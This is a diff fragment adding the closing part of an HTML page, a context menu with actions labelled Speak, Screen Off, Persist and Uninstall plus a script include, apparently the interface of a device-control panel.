+    <div class="ctx-item" data-action="speak">Speak</div>
+    <div class="ctx-item" data-action="screenoff">Screen Off</div>
+    <div class="ctx-item" data-action="persist">Persist</div>
+    <div class="ctx-item" data-action="uninstall" style="color:#f44">Uninstall</div>
+</div>
+
+<script src="script.js"></script>
+</body>
+</html>
